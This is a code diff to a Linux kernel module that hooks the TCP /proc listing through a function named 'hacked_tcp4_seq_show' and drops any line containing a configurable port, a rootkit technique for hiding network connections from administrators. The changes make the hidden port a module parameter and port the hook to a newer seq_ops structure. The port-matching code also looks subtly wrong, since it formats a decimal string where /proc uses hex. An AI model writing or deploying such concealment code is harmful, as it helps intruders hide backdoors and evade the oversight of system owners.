@@ -9,8 +9,8 @@
 
 //#define PORT_TO_HIDE 9999
 
-static char* port = "9999"
-module_param(name, charp, S_IRUGO);
+static char* port_to_hide = "9999";
+module_param(port_to_hide, charp, S_IRUGO);
 
 MODULE_LICENSE("GPL");
 
@@ -33,7 +33,7 @@ int hacked_tcp4_seq_show(struct seq_file *seq, void *v)
 
         char port[12];
 
-        sprintf(port,"%04X",PORT_TO_HIDE);
+        sprintf(port,"%04s",port_to_hide);
 
         if(strnstr(seq->buf+seq->count-TMPSZ,port,TMPSZ))
 	        seq->count -= TMPSZ;
@@ -49,9 +49,9 @@ static int __init myinit(void)
                 my_dir_entry = my_dir_entry->next;
 
         if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data)){
-                old_tcp4_seq_show = my_afinfo->seq_show;
-                my_afinfo->seq_show = hacked_tcp4_seq_show;
-	}											        }
+                old_tcp4_seq_show = my_afinfo->seq_ops.show;
+                my_afinfo->seq_ops.show = hacked_tcp4_seq_show;
+	} 
 				                        
         return 0;
 }
@@ -65,7 +65,7 @@ static void myexit(void)
                 my_dir_entry = my_dir_entry->next;
 				        
         if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data)) {
-	        my_afinfo->seq_show=old_tcp4_seq_show;
+	        my_afinfo->seq_ops.show=old_tcp4_seq_show;
         }					                
 }
                       
